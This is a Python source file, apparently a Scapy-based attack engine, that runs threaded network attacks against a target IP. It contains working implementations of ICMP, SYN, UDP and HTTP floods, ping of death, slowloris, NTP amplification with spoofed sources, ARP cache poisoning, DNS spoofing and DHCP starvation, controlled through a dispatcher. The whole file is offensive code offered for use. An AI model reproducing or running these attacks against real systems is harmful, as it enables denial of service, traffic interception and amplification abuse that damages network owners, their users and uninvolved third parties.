from scapy.all import *
from threading import Thread, Event, Lock
import logging
import random
import time
import socket

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# Attack tracking dictionaries and locks
attack_progress = {}
attack_stop_events = {}  # Holds stop events for each attack
flags_lock = Lock()

# Helper function to log progress
def log_progress(attack_id, message):
    with flags_lock:
        attack_progress[attack_id] = message
    logging.info(f"Attack {attack_id}: {message}")

# Unified attack execution
def execute_attack(attack_id, attack_type, target_ip, port=None, threads=10, **kwargs):
    logging.info(f"Attack {attack_id} started: {attack_type} on {target_ip}:{port}")
    try:
        # Initialize the stop event
        with flags_lock:
            attack_progress[attack_id] = "Starting attack..."
            attack_stop_events[attack_id] = Event()

        # Attack worker
        def attack_worker():
            try:
                attack_methods = {
                    'icmp_flood': perform_icmp_flood,
                    'syn_flood': perform_syn_flood,
                    'udp_flood': perform_udp_flood,
                    'arp_poison': perform_arp_poison,
                    'dns_spoof': perform_dns_spoof,
                    'dhcp_starvation': perform_dhcp_starvation,
                    'ping_of_death': perform_ping_of_death,
                    'slowloris': perform_slowloris,
                    'custom_attack': perform_custom_attack,
                    'http_flood': perform_http_flood,
                    'ntp_amplification': perform_ntp_amplification,
                }
                attack_function = attack_methods.get(attack_type)
                if attack_function:
                    attack_function(attack_id, target_ip, port, **kwargs)
                else:
                    log_progress(attack_id, "Invalid attack type.")
            except Exception as e:
                log_progress(attack_id, f"Error in thread: {e}")

        # Launch threads
        threads_list = []
        for _ in range(threads):
            thread = Thread(target=attack_worker)
            thread.start()
            threads_list.append(thread)

        # Wait for threads to finish
        for thread in threads_list:
            thread.join()

        log_progress(attack_id, f"Attack {attack_id} completed.")
    except Exception as e:
        log_progress(attack_id, f"Error executing attack: {e}")
    finally:
        logging.info(f"Cleaning up progress for attack_id: {attack_id}")
        with flags_lock:
            attack_stop_events.pop(attack_id, None)
            attack_progress.pop(attack_id, None)

# Attack Implementations
def perform_icmp_flood(attack_id, target_ip, port, **kwargs):
    while not attack_stop_events[attack_id].is_set():
        payload = random._urandom(2024)  # Larger payload for more visibility
        send(IP(src=RandIP(), dst=target_ip)/ICMP()/Raw(load=payload), verbose=False) # type: ignore
        log_progress(attack_id, "ICMP flood in progress.")

def perform_syn_flood(attack_id, target_ip, port, **kwargs):
    if not port:
        log_progress(attack_id, "Port is required for SYN flood.")
        return
    while not attack_stop_events[attack_id].is_set():
        src_ip = RandIP()
        send(IP(src=src_ip, dst=target_ip)/TCP(sport=RandShort(), dport=port, flags="S"), verbose=False) # type: ignore
        log_progress(attack_id, f"SYN flood from {src_ip} to {target_ip}:{port} in progress.")

def perform_udp_flood(attack_id, target_ip, port, **kwargs):
    if not port:
        log_progress(attack_id, "Port is required for UDP flood.")
        return
    while not attack_stop_events[attack_id].is_set():
        payload = random._urandom(1024)  # Randomized payload
        send(IP(src=RandIP(), dst=target_ip)/UDP(dport=port)/Raw(load=payload), verbose=False)
        log_progress(attack_id, "UDP flood in progress.")

def perform_ping_of_death(attack_id, target_ip, port, **kwargs):
    while not attack_stop_events[attack_id].is_set():
        payload = b"X" * 65500  # Large payload for detection
        send(IP(dst=target_ip)/ICMP()/payload, verbose=False)
        log_progress(attack_id, "Ping of Death in progress.")

def perform_arp_poison(attack_id, target_ip, port=None, gateway_ip=None, **kwargs):
    victim_mac = getmacbyip(target_ip)
    gateway_mac = getmacbyip(gateway_ip)
    while not attack_stop_events[attack_id].is_set():
        send(ARP(op=2, pdst=target_ip, psrc=gateway_ip, hwdst=victim_mac), verbose=False)
        send(ARP(op=2, pdst=gateway_ip, psrc=target_ip, hwdst=gateway_mac), verbose=False)
        log_progress(attack_id, "ARP poisoning in progress.")
        time.sleep(2)

def perform_dns_spoof(attack_id, target_ip, port=None, spoofed_domain="example.com", spoofed_ip="192.168.1.100", **kwargs):
    def dns_spoof(pkt):
        if pkt.haslayer(DNS) and pkt[DNS].qd.qname.decode() == spoofed_domain:
            spoofed_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst) / \
                          UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport) / \
                          DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd, an=DNSRR(rrname=spoofed_domain, ttl=10, rdata=spoofed_ip))
            send(spoofed_pkt, verbose=False)
            log_progress(attack_id, f"Sent spoofed DNS response to {pkt[IP].src}")
    sniff(filter=f"udp port 53 and ip src {target_ip}", prn=dns_spoof, store=0)

def perform_dhcp_starvation(attack_id, target_ip=None, port=None, **kwargs):
    while not attack_stop_events[attack_id].is_set():
        fake_mac = RandMAC()
        dhcp_discover = Ether(src=fake_mac, dst="ff:ff:ff:ff:ff:ff") / \
                        IP(src="0.0.0.0", dst="255.255.255.255") / \
                        UDP(sport=68, dport=67) / \
                        BOOTP(chaddr=[fake_mac]) / \
                        DHCP(options=[("message-type", "discover"), "end"])
        sendp(dhcp_discover, verbose=False)
        log_progress(attack_id, "DHCP starvation in progress.")
        time.sleep(1)

def perform_http_flood(attack_id, target_ip, port, **kwargs):
    while not attack_stop_events[attack_id].is_set():
        request = f"GET / HTTP/1.1\r\nHost: {target_ip}\r\n\r\n"
        send(IP(dst=target_ip)/TCP(dport=port)/Raw(load=request), verbose=False)
        log_progress(attack_id, "HTTP Flood in progress.")

def perform_ntp_amplification(attack_id, target_ip, port=None, **kwargs):
    ntp_request = Raw(load="\x17\x00\x03\x2a" + "\x00" * 44)
    while not attack_stop_events[attack_id].is_set():
        send(IP(src=RandIP(), dst=target_ip)/UDP(dport=123)/ntp_request, verbose=False)
        log_progress(attack_id, "NTP amplification in progress.")

def perform_slowloris(attack_id, target_ip, port, **kwargs):
    sockets = []
    for _ in range(200):  # Create multiple sockets
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target_ip, port))
        s.send(b"GET / HTTP/1.1\r\n")
        sockets.append(s)
        time.sleep(0.1)  # Delay for stability
    log_progress(attack_id, "Slowloris attack initialized.")
    while not attack_stop_events[attack_id].is_set():
        for s in sockets:
            s.send(b"X-a: b\r\n")
        log_progress(attack_id, "Slowloris in progress.")
        time.sleep(15)

def perform_custom_attack(attack_id, target_ip, port, payload, **kwargs):
    while not attack_stop_events[attack_id].is_set():
        send(IP(src=RandIP(), dst=target_ip)/TCP(dport=port)/Raw(load=payload), verbose=False) # type: ignore
        log_progress(attack_id, "Custom attack in progress.")

